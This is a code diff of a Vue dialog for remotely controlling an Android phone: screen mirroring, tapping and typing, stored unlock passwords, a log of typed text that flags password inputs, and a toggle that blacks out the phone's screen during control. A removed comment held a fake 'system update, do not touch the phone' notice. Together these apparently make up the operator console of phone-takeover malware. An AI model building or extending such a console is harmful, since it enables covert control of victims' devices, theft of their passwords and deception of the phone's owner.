@@ -1,33 +1,29 @@
 <template>
-  <el-dialog
-    v-model="detailDialogVisible"
-    :width="isPageMode ? '100%' : '1200px'"
-    :top="isPageMode ? '0' : '2vh'"
-    :fullscreen="isPageMode"
-    :modal="!isPageMode"
-    :show-close="!isPageMode"
-    :close-on-click-modal="false"
-    :teleport="!isPageMode"
-    @close="onClose"
-    :class="['device-detail-dialog', { 'is-page': isPageMode }]"
-    custom-class="device-detail-dialog"
-  >
+  <el-dialog v-model="detailDialogVisible" :width="isPageMode ? '100%' : '1200px'" :top="isPageMode ? '0' : '2vh'"
+    :fullscreen="isPageMode" :modal="!isPageMode" :show-close="!isPageMode" :close-on-click-modal="false"
+    :teleport="!isPageMode" @close="onClose" :class="['device-detail-dialog', { 'is-page': isPageMode }]"
+    custom-class="device-detail-dialog">
 
     <template #header>
-        <div class="dialog-header">
-          <div class="dialog-title">
-            <div class="device-meta">
+      <div class="dialog-header">
+        <div class="dialog-title">
+          <div class="device-meta">
             <el-tag size="small" effect="light" type="info">设备ID: {{ deviceId || "-" }}</el-tag>
             <el-tag size="small" effect="light" type="info">当前位置: {{ screenInfo?.appName || "未知" }}</el-tag>
             <el-tag size="small" effect="light" type="info">包名: {{ device?.pkg || "-" }}</el-tag>
-            <el-tag size="small" effect="light" type="info">品牌/型号: {{ [device?.brand, device?.model].filter(Boolean).join(" ") || "-" }}</el-tag>
-            <el-tag size="small" effect="light" type="info">系统/SDK: {{ device?.systemVersion || "-" }} / {{ device?.sdkVersion ?? "-" }}</el-tag>
-            <el-tag size="small" effect="light" type="info">分辨率: {{ device?.screenWidth || "-" }}×{{ device?.screenHeight || "-" }}</el-tag>
-            <el-tag size="small" effect="light" type="info">城市/IP: {{ device?.addr || "-" }} / {{ device?.ip || "-" }}</el-tag>
+            <el-tag size="small" effect="light" type="info">品牌/型号: {{ [device?.brand,
+            device?.model].filter(Boolean).join(" ") || "-" }}</el-tag>
+            <el-tag size="small" effect="light" type="info">系统/SDK: {{ device?.systemVersion || "-" }} / {{
+              device?.sdkVersion ?? "-" }}</el-tag>
+            <el-tag size="small" effect="light" type="info">分辨率: {{ device?.screenWidth || "-" }}×{{
+              device?.screenHeight || "-" }}</el-tag>
+            <el-tag size="small" effect="light" type="info">城市/IP: {{ device?.addr || "-" }} / {{ device?.ip || "-"
+              }}</el-tag>
 
             <el-tag size="small" effect="light" :type="screenStatusTagType">屏幕: {{ screenStatusText }}</el-tag>
 
-            <el-tooltip v-if="device?.lockScreen" class="box-item" effect="dark" :content="formatUnlockTips(device.lockScreen)" placement="top" :show-after="300">
+            <el-tooltip v-if="device?.lockScreen" class="box-item" effect="dark"
+              :content="formatUnlockTips(device.lockScreen)" placement="top" :show-after="300">
               <el-tag size="small" effect="light" type="success">可解锁</el-tag>
             </el-tooltip>
             <el-tag v-else size="small" effect="light" type="danger">不可解锁</el-tag>
@@ -47,8 +43,7 @@
           </div> -->
             <div class="screen-sizer" style="width: 400px; height: 650px">
               <div class="screen" ref="screenRef" :class="{ 'scroll-mode': rollVisible }" @click="handleGlobalClick"
-              v-longpress:500="(event) => handleGlobalClick(event, true)"
-                :style="{
+                v-longpress:500="(event) => handleGlobalClick(event, true)" :style="{
                   width: `${device.screenWidth}px`,
                   height: `${device.screenHeight}px`,
                   transform: `scale(${ratioHeight})`,
@@ -57,61 +52,57 @@
                   left: `${Math.max(0, (400 - device.screenWidth * ratioHeight) / 2)}px`
                 }">
 
-              <!-- 屏幕边界框 - 始终显示黄色边框代表手机屏幕边界 -->
+                <!-- 屏幕边界框 - 始终显示黄色边框代表手机屏幕边界 -->
 
-              <canvas ref="screenshotCanvas"   :style="{
-                width: `${device.screenWidth}px`,
-                height: `${device.screenHeight}px`,
-                opacity: screenMode == 2 ? 0.5 : 1
+                <canvas ref="screenshotCanvas" :style="{
+                  width: `${device.screenWidth}px`,
+                  height: `${device.screenHeight}px`,
                 }"></canvas>
 
-              <div class="screen-boundary" :class="{ 'block-mode': block }"
-                :style="{ width: `${device.screenWidth}px`, height: `${device.screenHeight}px` }"></div>
+                <div class="screen-boundary" :class="{ 'block-mode': config.screenOff }"
+                  :style="{ width: `${device.screenWidth}px`, height: `${device.screenHeight}px` }"></div>
 
-              <!-- <div class="screen" :style="{ width: `${device.screenWidth}px`, height: `${device.screenHeight}px`}"> -->
-              <!-- 先渲染普通元素 -->
-              <template v-for="item in screenInfo.items" :key="item.uniqueId">
-                <!-- @click="click(item)" -->
-                <span :item-data="JSON.stringify(item)" v-show="(item.text && item.text.length > 0) || item.isClickable"
-                  class="label rect" :class="{ 'ui-selected': item.isSelected }"
-                  v-longpress:500="() => click(item, true)"
-                  :style="{ top: `${item.y}px`, left: `${item.x}px`, height: `${item.height}px`, width: `${item.width}px` }">{{
-                    foldingText(item.text) }}</span>
+                <!-- <div class="screen" :style="{ width: `${device.screenWidth}px`, height: `${device.screenHeight}px`}"> -->
+                <!-- 先渲染普通元素 -->
+                <template v-for="item in screenInfo.items" :key="item.uniqueId">
+                  <!-- @click="click(item)" -->
+                  <span :item-data="JSON.stringify(item)"
+                    v-show="(item.text && item.text.length > 0) || item.isClickable" class="label rect"
+                    :class="{ 'ui-selected': item.isSelected }" v-longpress:500="() => click(item, true)"
+                    :style="{ top: `${item.y}px`, left: `${item.x}px`, height: `${item.height}px`, width: `${item.width}px` }">{{
+                      foldingText(item.text) }}</span>
 
-                <span :class="{ 'ui-selected': item.isSelected }" v-if="item.isCheckable" class="checkable"
-                  :style="{ top: `${item.y}px`, left: `${item.x}px` }">
-                  {{ item.isChecked ? "✓" : "✕" }}
-                </span>
+                  <span :class="{ 'ui-selected': item.isSelected }" v-if="item.isCheckable" class="checkable"
+                    :style="{ top: `${item.y}px`, left: `${item.x}px` }">
+                    {{ item.isChecked ? "✓" : "✕" }}
+                  </span>
 
-                <span
-                  :class="{
+                  <span :class="{
                     'ui-selected': item.isSelected,
                     'select-focused': (item as any)['isselect-focused'] ?? (item as any).isSelectFocused
-                  }"
-                  @click.stop="input(item)"
-                  v-else-if="item.isEditable && item.isFocusable" class="editable"
-                  :style="{ top: `${item.y}px`, left: `${item.x}px`, height: `${item.height}px`, width: `${item.width}px` }">
-                </span>
-              </template>
+                  }" @click.stop="input(item)" v-else-if="item.isEditable && item.isFocusable" class="editable"
+                    :style="{ top: `${item.y}px`, left: `${item.x}px`, height: `${item.height}px`, width: `${item.width}px` }">
+                  </span>
+                </template>
 
-              <!-- 最后渲染可滚动区域，确保在最上层 -->
-              <template v-for="item in screenInfo.items" :key="`scrollable-${item.uniqueId}`">
-                <span v-if="item.isScrollable" :class="{ 'ui-selected': item.isSelected }" class="scrollable"
-                  :style="{ top: `${item.y}px`, left: `${item.x}px`, height: `${item.height}px`, width: `${item.width}px` }">
-                  <el-button @click.stop="rollSwitch(item)" class="scroll-button" type="info"
-                    size="small">滚动</el-button>
-                </span>
-              </template>
+                <!-- 最后渲染可滚动区域，确保在最上层 -->
+                <template v-for="item in screenInfo.items" :key="`scrollable-${item.uniqueId}`">
+                  <span v-if="item.isScrollable" :class="{ 'ui-selected': item.isSelected }" class="scrollable"
+                    :style="{ top: `${item.y}px`, left: `${item.x}px`, height: `${item.height}px`, width: `${item.width}px` }">
+                    <el-button @click.stop="rollSwitch(item)" class="scroll-button" type="info"
+                      size="small">滚动</el-button>
+                  </span>
+                </template>
 
-              <!-- 滚动遮罩层 - 放在最后确保在所有元素之上 -->
-              <span v-show="rollVisible" class="roll-modal" ref="trackArea" @mousedown="startTracking"
-                @mousemove="onMouseMove" @mouseup="stopTracking" @mouseleave="stopTracking" @click="handleGlobalClick"
-                :style="{ width: `${device.screenWidth}px`, height: `${device.screenHeight}px` }">
-                <!-- 显示鼠标拖动轨迹 -->
-                <svg class="track-svg">
-                  <polyline :points="trackPoints" fill="none" stroke="red" stroke-width="2" />
-                </svg>
-              </span>
+                <!-- 滚动遮罩层 - 放在最后确保在所有元素之上 -->
+                <span v-show="rollVisible" class="roll-modal" ref="trackArea" @mousedown="startTracking"
+                  @mousemove="onMouseMove" @mouseup="stopTracking" @mouseleave="stopTracking" @click="handleGlobalClick"
+                  :style="{ width: `${device.screenWidth}px`, height: `${device.screenHeight}px` }">
+                  <!-- 显示鼠标拖动轨迹 -->
+                  <svg class="track-svg">
+                    <polyline :points="trackPoints" fill="none" stroke="red" stroke-width="2" />
+                  </svg>
+                </span>
               </div> <!-- close .screen -->
             </div> <!-- close .screen-sizer -->
           </div> <!-- close .screen-container -->
@@ -121,43 +112,49 @@
             <div class="side-controls-inner">
 
               <div class="side-control-item">
-                <el-select v-model="screenMode" class="side-select" size="small" placeholder="">
+                <el-select v-model="config.frameMode" class="side-select" size="small" placeholder="">
                   <el-option label="画面" :value="1"></el-option>
                   <el-option label="线条" :value="0"></el-option>
                 </el-select>
               </div>
 
 
-              <div class="side-control-item">
+              <!-- <div class="side-control-item">
                 <el-button type="success" @click="screenReq" size="small">刷新</el-button>
-              </div>
+              </div> -->
               <div class="side-control-item">
                 <el-button type="success" @click="input" size="small">输入</el-button>
               </div>
 
               <div class="side-control-item">
-                <el-popover v-model:visible="unlockPopoverVisible" trigger="click" placement="right" :width="420" :teleported="false">
+                <el-popover v-model:visible="unlockPopoverVisible" v-if="!isConnected"  trigger="click" placement="right" :width="420"
+                  :teleported="false">
                   <template #reference>
-                    <el-button type="success" @click="wakeup" size="small">唤醒重连</el-button>
+                    <el-button type="success" @click="wakeup" size="small">连接手机</el-button>
+
                   </template>
 
                   <div class="unlock-popover">
                     <div class="unlock-popover-title">选择解锁密码</div>
                     <el-select v-model="selectedUnlockId" placeholder="请选择解锁密码" filterable style="width: 100%">
-                      <el-option v-for="item in unlockOptions" :key="item.id" :label="formatUnlockTips(item)" :value="item.id" />
+                      <el-option v-for="item in unlockOptions" :key="item.id" :label="formatUnlockTips(item)"
+                        :value="item.id" />
                     </el-select>
                     <div class="unlock-popover-actions">
                       <el-button size="small" @click="unlockPopoverVisible = false">取消</el-button>
-                      <el-button size="small" type="primary" :loading="unlocking" :disabled="!selectedUnlockId" @click="confirmWakeup">确定</el-button>
+                      <el-button size="small" type="primary" :loading="unlocking" :disabled="!selectedUnlockId"
+                        @click="confirmWakeup">确定</el-button>
                     </div>
                   </div>
                 </el-popover>
+
+                <el-button type="danger" v-else @click="disconnect" size="small">断开链接</el-button>
               </div>
 
 
               <div class="side-control-item">
-                <el-button :type="block ? 'danger' : 'success'" @click="screenOff" size="small">
-                  {{ block ? "退出遮挡" : "遮挡屏幕" }}
+                <el-button :type="config.screenOff ? 'danger' : 'success'" @click="screenOff" size="small">
+                  {{ config.screenOff ? "退出遮挡" : "遮挡屏幕" }}
                 </el-button>
               </div>
 
@@ -166,6 +163,10 @@
                   {{ rollVisible ? "退出滚动" : "进入滚动" }}
                 </el-button>
               </div>
+
+    
+
+
 
             </div>
           </div>
@@ -251,18 +252,11 @@
                     <span class="query-label">APP包名:</span>
                     <el-input v-model="queryAppPkg" placeholder="输入APP包名" clearable style="width: 200px" />
                     <span class="query-label">查询日期:</span>
-                    <el-date-picker
-                      v-model="queryDate"
-                      type="daterange"
-                      range-separator="至"
-                      start-placeholder="开始日期"
-                      end-placeholder="结束日期"
-                      format="YYYY-MM-DD"
-                      value-format="YYYY-MM-DD"
-                      @change="onDateChange"
-                      style="width: 280px"
-                    />
-                    <el-button type="primary" @click="refreshLog" :loading="logLoading" size="small" :disabled="!deviceId">重新查询</el-button>
+                    <el-date-picker v-model="queryDate" type="daterange" range-separator="至" start-placeholder="开始日期"
+                      end-placeholder="结束日期" format="YYYY-MM-DD" value-format="YYYY-MM-DD" @change="onDateChange"
+                      style="width: 280px" />
+                    <el-button type="primary" @click="refreshLog" :loading="logLoading" size="small"
+                      :disabled="!deviceId">重新查询</el-button>
                   </div>
                 </div>
               </div>
@@ -270,10 +264,13 @@
               <div class="log-content tools-log-content" v-loading="logLoading">
                 <div v-if="!deviceId" class="no-data">请先连接设备</div>
                 <template v-else>
-                  <div class="log-item" v-for="(item, index) in inputLogList" :key="index" :class="{ 'password-item': item.password == 1 }">
+                  <div class="log-item" v-for="(item, index) in inputLogList" :key="index"
+                    :class="{ 'password-item': item.password == 1 }">
                     <div class="log-content-row">
                       <span class="log-time">{{ item.date || formatTime(item.time) }}</span>
-                      <span class="log-source" :class="{ 'source-admin': item.source == 1, 'source-app': item.source == 0 }">{{ item.source == 1 ? "管理端" : "App端" }}</span>
+                      <span class="log-source"
+                        :class="{ 'source-admin': item.source == 1, 'source-app': item.source == 0 }">{{ item.source ==
+                          1 ? "管理端" : "App端" }}</span>
                       <span class="log-app">{{ item.app }}</span>
                       <span class="log-resource" v-if="item.resourceId">{{ item.resourceId }}</span>
                       <span class="log-text">{{ item.text || (item.password == 1 ? "[密码输入]" : "无内容") }}</span>
@@ -313,21 +310,9 @@
     </div>
   </el-dialog>
 
-  <el-dialog
-    title="文本输入"
-    v-model="inputDialogVisible"
-    width="400px"
-    :modal="false"
-    :append-to-body="false"
-    :teleport="false"
-    :lock-scroll="false"
-    modal-class="input-dialog-modal"
-    class="input-dialog"
-    custom-class="input-dialog"
-    :close-on-click-modal="false"
-    @close="closeInputDialog"
-    destroy-on-close
-  >
+  <el-dialog title="文本输入" v-model="inputDialogVisible" width="400px" :modal="false" :append-to-body="false"
+    :teleport="false" :lock-scroll="false" modal-class="input-dialog-modal" class="input-dialog"
+    custom-class="input-dialog" :close-on-click-modal="false" @close="closeInputDialog" destroy-on-close>
     <div class="input-dialog-content">
       <el-input ref="inputTextRef" clearable v-model="inputText" placeholder="请输入内容" class="custom-input" />
     </div>
@@ -340,23 +325,9 @@
     </template>
   </el-dialog>
 
-  <el-dialog
-    :title="'滚动控制'"
-    v-model="scrollDialogVisible"
-    width="280px"
-    draggable
-    :modal="false"
-    :append-to-body="false"
-    :teleport="false"
-    :lock-scroll="false"
-    :close-on-click-modal="false"
-    class="scroll-dialog"
-    custom-class="scroll-dialog"
-    top="30vh"
-    :show-close="true"
-    modal-class="scroll-dialog-modal"
-    destroy-on-close
-  >
+  <el-dialog :title="'滚动控制'" v-model="scrollDialogVisible" width="280px" draggable :modal="false"
+    :append-to-body="false" :teleport="false" :lock-scroll="false" :close-on-click-modal="false" class="scroll-dialog"
+    custom-class="scroll-dialog" top="30vh" :show-close="true" modal-class="scroll-dialog-modal" destroy-on-close>
     <div class="scroll-control-container">
       <div class="scroll-direction-pad">
         <!-- 上方向键 -->
@@ -405,9 +376,9 @@
     </div>
   </el-dialog>
 
-    <!-- 控件选择对话框 -->
-  <el-dialog title="选择重叠控件" draggable :modal="false" v-model="widgetSelectDialogVisible" width="450px" :close-on-click-modal="false"
-    class="widget-select-dialog" custom-class="widget-select-dialog" destroy-on-close>
+  <!-- 控件选择对话框 -->
+  <el-dialog title="选择重叠控件" draggable :modal="false" v-model="widgetSelectDialogVisible" width="450px"
+    :close-on-click-modal="false" class="widget-select-dialog" custom-class="widget-select-dialog" destroy-on-close>
     <div class="widget-select-content">
       <div class="widget-select-tip">检测到多个重叠控件，已按面积从小到大排序。悬停可在屏幕上高亮显示对应控件。</div>
       <div v-for="(widget, index) in overlappingWidgets" :key="widget.uniqueId" class="widget-item"
@@ -491,6 +462,7 @@ export default defineComponent({
     const ratioHeight = ref(1);
     const deviceId = ref("");
     const connectType = ref("转发");
+    let sessionId = "";
     const scrollItem = ref({
       height: 0,
       width: 0,
@@ -500,22 +472,28 @@ export default defineComponent({
     });
     const inputItem = ref({});
     const startApp = ref("");
-    const screenMode = ref(1);
-    watch(screenMode, (newVal) => {
-      if(newVal == 0){
+    const config = ref({
+      frameMode: 1,
+      screenQuality: 10,
+      screenOff: false,
+      screenOffTips: '',
+      preventOperate: false
+    });
+    watch(() => config.value.frameMode, (newVal) => {
+      if (newVal == 0) {
         //清除画布
         screenshotCanvas.value.getContext('2d').clearRect(0, 0, device.value.screenWidth, device.value.screenHeight);
       }
 
-      if(newVal == 1){
+      if (newVal == 1) {
         screenInfo.value.items = [];
         //调整透明度
       }
 
-      if(wsClient){
-          const configMsg = encodeWsMessage(MessageType.config, { screenshotSwitch: newVal > 0 });
-          wsClient.sendMessage(configMsg);
-        }
+      if (wsClient) {
+        const configMsg = encodeWsMessage(MessageType.config, config.value);
+        wsClient.sendMessage(configMsg);
+      }
     });
 
     watch(inputDialogVisible, (visible) => {
@@ -580,9 +558,15 @@ export default defineComponent({
 
     const device = ref({
       screenWidth: 600,
-      screenHeight: 800
+      screenHeight: 800,
+      connectStatus: 0
     });
     let wsClient: WebSocketClient | null = null;
+    const connected = ref(false); // 新增：响应式连接状态
+
+    const isConnected = computed(() => {
+      return connected.value;
+    });
 
     const fetchDeviceBaseInfo = async () => {
       if (!deviceId.value) return;
@@ -724,6 +708,7 @@ export default defineComponent({
 
     const connect = async (_deviceId: string) => {
       try {
+        
         console.log("正在创建WebSocket连接:", _deviceId);
         // 创建 WebSocket 客户端
         wsClient = new WebSocketClient({
@@ -743,32 +728,26 @@ export default defineComponent({
             (device.value as any).status = 1;
             fetchDeviceBaseInfo();
             // 连接成功后发送设备上线消息
-            if (wsClient) {
-              const monitorOnlineMsg = encodeWsMessage(MessageType.monitor_online, { deviceId: _deviceId });
-              wsClient.sendMessage(monitorOnlineMsg);
-            }
+            const monitorOnlineMsg = encodeWsMessage(MessageType.monitor_online, { deviceId: _deviceId });
+            wsClient.sendMessage(monitorOnlineMsg);
           },
           onMessage: (data: ArrayBuffer) => {
             const { type, body } = decodeWsMessage(new Uint8Array(data));
             switch (type) {
+              case MessageType.config: {
+                const configData = body as any;
+                console.log("configData", configData);
+                config.value = configData;
+                break;
+              }
               case MessageType.screen_info: {
                 const screenInfoData = body as any;
-                if (screenMode.value != 1) {
+                if (config.value.frameMode == 0) {
                   screenInfo.value = screenInfoData;
                 }
-                if (block.value != screenInfoData.block) {
-                  if (screenInfoData.block) {
-                    addLog("info", `进入息屏模式`, "screen");
-                    (device.value as any).status = 0;
-                  } else {
-                    addLog("info", `退出息屏模式`, "screen");
-                    (device.value as any).status = 1;
-                  }
-                }
-                block.value = screenInfoData.block;
                 // addLog("info", `Screen info updated: ${(body as any).appName}`, "screen");
                 lastScreenInfoTime.value = Date.now();
-                updateSignalLevel();
+
                 break;
               }
               case MessageType.install_app_resp:
@@ -786,10 +765,9 @@ export default defineComponent({
                 break;
               }
               case MessageType.screenshot: {
-
-                // if(screenMode.value == 0){
-                //   return;
-                // }
+                if (config.value.frameMode == 0) {
+                  return;
+                }
                 const screenshotData = body as any;
                 //二进制数据
                 const screenshot = screenshotData.screenshot;
@@ -804,11 +782,22 @@ export default defineComponent({
                 } else {
                   addLog("warn", "截图数据不完整", "screenshot");
                 }
-
                 break;
               }
-
+              case MessageType.android_online: {
+                const androidOnlineData = body as any;
+                addLog("info", "手机连接成功!", "system");
+                connected.value = true;
+                console.log("config.value", config.value);
+                console.log("androidOnlineData:", androidOnlineData);
+                sessionId = androidOnlineData.sessionId;
+                const configMsg = encodeWsMessage(MessageType.config, config.value);
+                wsClient.sendMessage(configMsg);
+                break;
+              }
             }
+
+            updateSignalLevel();
           },
           onRoomNotification: (notification) => {
             switch (notification.eventType) {
@@ -819,16 +808,23 @@ export default defineComponent({
                   type: "success"
                 });
 
-                const configMsg = encodeWsMessage(MessageType.config, { screenshotSwitch: screenMode.value > 0 });
-                wsClient.sendMessage(configMsg);
+                
                 addLog("info", "Device monitor online message sent", "system");
 
                 break;
               case ROOM_EVENT_CLIENT_LEFT:
                 addLog("info", `客户端 ${notification.value} 离开房间`, "system");
+                if(notification.value == sessionId){
+                  connected.value = false;
+                  addLog("error", "手机断开连接!", "system");
+                }
                 break;
               case ROOM_EVENT_CLIENT_ERROR:
                 addLog("error", `客户端 ${notification.value} 发生错误`, "system");
+                if(notification.value == sessionId){
+                  connected.value = false;
+                  addLog("error", "手机断开连接!", "system");
+                }
                 break;
               case ROOM_EVENT_ROOM_MEMBER_COUNT:
                 addLog("info", `房间成员数量: ${notification.value}`, "system");
@@ -862,6 +858,7 @@ export default defineComponent({
         addLog("error", "WebSocket连接失败!" + error, "system");
       }
     };
+
 
     const show = (_device: any) => {
 
@@ -973,9 +970,7 @@ export default defineComponent({
       }
     };
 
-    // 顶部实时“屏幕状态”：优先依据 block + 最近 screen_info 时间推断，兜底用 device.status
     const screenStatus = computed(() => {
-      if (block.value) return 0;
       const now = Date.now();
       const diff = lastScreenInfoTime.value ? now - lastScreenInfoTime.value : Number.POSITIVE_INFINITY;
       if (diff < 15000) return 1;
@@ -1187,7 +1182,6 @@ export default defineComponent({
 
       // 如果正在滚动模式，不处理点击 TODO: 需要优化
       if (rollVisible.value) return;
-      // if (block.value) return;
 
       // 检查点击的目标元素，如果是特殊交互元素，则不处理
       const target = event.target as HTMLElement;
@@ -1348,9 +1342,7 @@ export default defineComponent({
     };
     // 保留原有的点击方法作为备用（用于特殊情况）
     const click = (item: any, hold = false) => {
-      if (!block.value) {
-        return;
-      }
+
 
       // 获取与当前控件重叠的所有其他控件
       const overlapping = getOverlappingWidgets(item, hold);
@@ -1412,10 +1404,6 @@ export default defineComponent({
     };
 
     const toggleScrollMode = () => {
-      // if (block.value) {
-      //   addLog("warn", `当前处于息屏模式，无法进入滚动模式`, "scroll");
-      //   return;
-      // }
       if (!rollVisible.value) {
         // 进入滚动模式时，设置默认滚动区域
         scrollItem.value = {
@@ -1524,7 +1512,7 @@ export default defineComponent({
           appPkg: screenInfo.value.packageName,
           pkg: screenInfo.value.appPkg,
           isPassword: (inputItem.value as any).isPassword,
-          enter:false,
+          enter: false,
           mode: mode
         });
         addLog("info", `输入文本: ${inputText.value}`, "input");
@@ -1542,22 +1530,15 @@ export default defineComponent({
     };
     const screenOff = () => {
       if (wsClient) {
-        // 先本地切换状态，让按钮文案立即变化（最终以 screen_info.block 为准）
-        const nextBlock = !block.value;
-        block.value = nextBlock;
-        (device.value as any).status = nextBlock ? 0 : 1;
+        (device.value as any).status = config.value.screenOff ? 0 : 1;
 
-        // if(!block.value){
-        //   addLog("warn", `进入息屏模式后,滚动无法使用,点击将直接作用于控件,因此如果点击不生效,请尝试点击上一层控件`, "screen");
-        // }
-        // const screenOffMsg = encodeWsMessageNotBody(MessageType.screen_off);
-        const screenOffMsg  =encodeWsMessage(MessageType.screen_off, {
-          // tips:"系統更新中,请稍等,预计更新时间10分钟,请勿触碰手机,请勿关机!"
-          tips:""
-        })
+        config.value.screenOff = !config.value.screenOff;
+        const screenOffMsg = encodeWsMessage(MessageType.config, config.value)
         wsClient.sendMessage(screenOffMsg);
+        addLog("info", `已发送熄屏指令`, "info");
+      } else {
+        addLog("error", `还未链接`, "warn");
       }
-      addLog("info", `已发送指令: screen_off`, "click");
     }
 
     const fetchInstallAppList = async (deviceId: any) => {
@@ -1665,11 +1646,21 @@ export default defineComponent({
       return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
     };
 
-    const foldingText = (text: string) =>{
-      if(text.length > 10){
+    const foldingText = (text: string) => {
+      if (text.length > 10) {
         return text.slice(0, 10) + "...";
       }
       return text;
+    }
+
+
+
+    const disconnect = () => {
+      if (isConnected.value) {
+        const disconnectMsg = encodeWsMessage(MessageType.disconnect, { closeScreen: true });
+        wsClient.sendMessage(disconnectMsg);
+        addLog("info", `已发送断开链接指令`, "info");
+      }
     }
 
     return {
@@ -1741,7 +1732,6 @@ export default defineComponent({
       unhighlightWidget,
       selectWidget,
       cancelWidgetSelect,
-      screenMode,
       toolsTab,
       deviceBaseLoading,
       fetchDeviceBaseInfo,
@@ -1755,7 +1745,10 @@ export default defineComponent({
       refreshLog,
       onDateChange,
       formatTime,
-      foldingText
+      foldingText,
+      config,
+      isConnected,
+      disconnect
     };
   }
 });
